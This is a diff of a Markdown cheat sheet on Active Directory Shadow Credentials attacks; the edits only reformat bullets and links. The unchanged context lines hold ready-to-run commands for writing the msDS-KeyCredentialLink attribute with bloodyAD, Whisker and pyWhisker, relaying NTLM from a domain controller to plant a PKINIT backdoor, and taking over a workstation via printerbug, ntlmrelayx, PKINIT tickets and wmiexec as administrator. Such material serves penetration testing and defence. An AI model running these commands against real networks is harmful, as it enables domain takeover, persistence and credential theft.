@@ -11,13 +11,17 @@
 * PKINIT Kerberos authentication
 * An account with the delegated rights to write to the `msDS-KeyCredentialLink` attribute of the target object
 
-**Exploitation**: 
-- Windows/Linux
+**Exploitation**:
+
+* Windows/Linux
+
   ```ps1
   bloodyAD --host 10.1.0.4 -u bloodyAdmin -p 'Password123!' -d bloody add shadowCredentials targetpc$
   bloodyAD --host 10.1.0.4 -u bloodyAdmin -p 'Password123!' -d bloody remove shadowCredentials targetpc$ --key <key from previous output>
   ```
-- From Windows, use [Whisker](https://github.com/eladshamir/Whisker):
+
+* From Windows, use [eladshamir/Whisker](https://github.com/eladshamir/Whisker):
+
   ```powershell
   # Lists all the entries of the msDS-KeyCredentialLink attribute of the target object.
   Whisker.exe list /target:computername$
@@ -28,7 +32,8 @@
   Whisker.exe remove /target:computername$ /domain:constoso.local /dc:dc1.contoso.local /remove:2de4643a-2e0b-438f-a99d-5cb058b3254b
   ```
 
-- From Linux, use [pyWhisker](https://github.com/ShutdownRepo/pyWhisker):
+* From Linux, use [ShutdownRepo/pyWhisker](https://github.com/ShutdownRepo/pyWhisker):
+
   ```bash
   # Lists all the entries of the msDS-KeyCredentialLink attribute of the target object.
   python3 pywhisker.py -d "domain.local" -u "user1" -p "complexpassword" --target "user2" --action "list"
@@ -43,11 +48,10 @@
 
 ### Shadow Credential Relaying
 
-- Trigger an NTLM authentication from `DC01` (PetitPotam)
-- Relay it to `DC02` (ntlmrelayx)
-- Edit `DC01`'s attribute to create a Kerberos PKINIT pre-authentication backdoor (pywhisker)
-- Alternatively : `ntlmrelayx -t ldap://dc02 --shadow-credentials --shadow-target 'dc01$'`
-
+* Trigger an NTLM authentication from `DC01` (PetitPotam)
+* Relay it to `DC02` (ntlmrelayx)
+* Edit `DC01`'s attribute to create a Kerberos PKINIT pre-authentication backdoor (pywhisker)
+* Alternatively : `ntlmrelayx -t ldap://dc02 --shadow-credentials --shadow-target 'dc01$'`
 
 ### Workstation Takeover with RBCD
 
@@ -62,10 +66,9 @@
 * Enable port forward from port 8081 to 81 on the compromised machine: `rportfwd 8081 127.0.0.1 81`
 * Start the relay: `proxychains python3 ntlmrelayx.py -t ldaps://dc.domain.lab --shadow-credentials --shadow-target target\$ --http-port 81`
 * Trigger a callback on webdav: `proxychains python3 printerbug.py domain.lab/user:password@target.domain.lab compromised@8081/file`
-* Use [PKINIT](https://github.com/dirkjanm/PKINITtools) to get a TGT for the machine account: `proxychains python3 gettgtpkinit.py domain.lab/target\$ target.ccache -cert-pfx </path/from/previous/command.pfx> -pfx-pass <pfx-pass>`
+* Use [dirkjanm/PKINIT](https://github.com/dirkjanm/PKINITtools) to get a TGT for the machine account: `proxychains python3 gettgtpkinit.py domain.lab/target\$ target.ccache -cert-pfx </path/from/previous/command.pfx> -pfx-pass <pfx-pass>`
 * Elevate your privileges by creating a service ticket impersonating a local admin: `proxychains python3 gets4uticket.py kerberos+ccache://domain.lab\\target\$:target.ccache@dc.domain.lab cifs/target.domain.lab@domain.lab administrator@domain.lab administrator_target.ccache -v`
 * Use your ticket: `export KRB5CCNAME=/path/to/administrator_target.ccache; proxychains python3 wmiexec.py -k -no-pass domain.lab/administrator@target.domain.lab`
-
 
 ## References
 
